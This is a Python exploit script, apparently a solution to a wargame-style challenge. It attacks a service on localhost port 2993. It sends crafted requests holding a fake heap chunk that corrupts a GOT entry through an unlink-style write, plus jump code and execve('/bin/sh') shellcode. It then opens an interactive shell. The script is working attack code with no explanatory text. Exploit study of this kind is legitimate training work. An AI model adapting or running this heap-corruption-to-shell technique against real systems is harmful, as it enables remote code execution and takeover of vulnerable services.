import struct
import socket
import telnetlib

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",2993))
t = telnetlib.Telnet()
t.sock = s

reqsize = 128

def pad(string):
        padding = "\x00" * (reqsize - 4 - len(string))
        final = "FSRD" + string + padding
        return final[:reqsize]

fd = struct.pack("I",0x804d41c - 12) #write Got
bk = struct.pack("I",0x804e020)  #heap
negativeFour = struct.pack("I",0xfffffffc)
fake_chunk = negativeFour + negativeFour + fd + bk

jmp = "\xE9\x0C\x00\x00\x00"
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"  

chunk1 = pad("/" * 20 + jmp + "A" * 12 + shellcode + "/" * 120)
chunk2 = pad("AAAROOT/" + fake_chunk)
s.send(chunk1)
s.send(chunk2)
print(repr(chunk1))
print(repr(chunk2))

t.interact()
